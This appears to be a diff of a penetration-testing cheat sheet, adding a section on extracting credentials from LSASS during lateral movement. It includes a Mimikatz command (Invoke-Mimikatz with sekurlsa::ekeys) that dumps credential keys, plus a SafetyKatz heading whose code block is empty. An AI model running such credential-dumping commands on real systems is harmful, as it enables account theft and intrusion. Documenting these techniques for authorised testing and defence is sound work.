@@ -410,4 +410,15 @@ p:Pass@1234 hostname
 ## **Lateral Movement - Extracting Credentials from LSASS**
 
 
-- Dump 
+- Dump credentials on a local machine using Mimikatz
+
+```powershell
+$ Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
+
+
+- Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
+
+```powershell
+
+```
